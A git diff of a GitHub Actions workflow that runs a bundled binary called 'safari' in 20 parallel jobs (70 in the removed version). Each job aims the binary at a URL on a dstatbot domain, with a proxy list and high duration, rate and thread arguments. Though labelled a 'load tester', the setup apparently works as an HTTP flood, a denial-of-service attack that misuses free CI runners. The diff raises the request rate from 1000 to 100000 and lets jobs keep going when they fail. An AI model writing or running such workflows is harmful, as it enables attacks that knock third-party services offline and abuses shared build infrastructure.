@@ -1,67 +1,26 @@
-name: Parallel Node.js Execution
+name: Run Script (20 Parallel Instances)
 
 on:
   push:
-    branches: [ main ]
+    branches: [ main, master ]
   pull_request:
-    branches: [ main ]
+    branches: [ main, master ]
   workflow_dispatch:
 
 jobs:
-  parallel-execution-windows:
-    # Switch the runner environment to Windows
-    runs-on: windows-latest
+  run-script:
+    runs-on: ubuntu-latest
     strategy:
-      max-parallel: 100
-      fail-fast: false  # Continue even if some instances fail
+      fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-      
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.10'
-      
-      - name: Install dependencies
-        shell: pwsh
-        run: |
-          Get-ChildItem
-          
-      - name: Install Node.js dependencies
-        shell: pwsh
-        run:  |
-          npm install --force install hpack 
-            
-      - name: Run HTTP/3 load tester
-        shell: pwsh
-        run: |
-          Write-Host "=== Checking Files ==="
-          # Check if the binary exists (handles both 'safari' or 'safari.exe')
-          $binary = Get-ChildItem -Filter "safari*" | Select-Object -First 1
-          if ($null -eq $binary) {
-              Write-Error "The safari binary could not be found!"
-              exit 1
-          }
-          
-          # Check if proxies.txt is present
-          if (-not (Test-Path "proxies.txt")) {
-              Write-Error "proxies.txt is missing from the repository root!"
-              exit 1
-          }
-          
-          Write-Host "=== Starting Execution using $($binary.Name) ==="
-          # Execute the binary using PowerShell's invocation operator (&)
-          & ".\$($binary.Name)" https://c1.dstatbot.win/lURlGPR6 700 1000 90 proxies.txt --raw
-        env:
-          INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 70
-          RUNNER_OS: windows
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Make executable and run safari (Instance ${{ matrix.instance }})
+      run: |
+        chmod +x safari
+        ./safari https://c1.dstatbot.win/aQbcn9Rm 700 100000 90 proxies.txt --raw
+      continue-on-error: true
